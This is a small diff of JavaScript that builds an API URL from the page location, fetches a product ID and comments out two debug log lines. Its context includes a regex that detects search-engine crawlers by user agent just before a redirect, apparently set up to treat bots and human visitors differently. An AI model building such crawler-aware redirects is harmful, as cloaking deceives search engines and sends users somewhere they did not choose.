@@ -11,7 +11,7 @@
 				var lang = location.pathname.split('/').pop(); // 'es';
 				var id = location.search.split('&').shift().split('-').pop();
 				var api_url = endpoint+'/item/'+domain+'/'+lang+'/'+id;
-				console.log(api_url);
+				//console.log(api_url);
 
 				function fetchProductId(url) {
 					fetch(url)
@@ -24,7 +24,7 @@
 						.then(data => {
 						// Mengambil nilai productId dari JSON
 						var productId = data.productId;
-						console.log(productId);
+						//console.log(productId);
 
 						// Logika redirect setelah mendapatkan productId
 						var isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
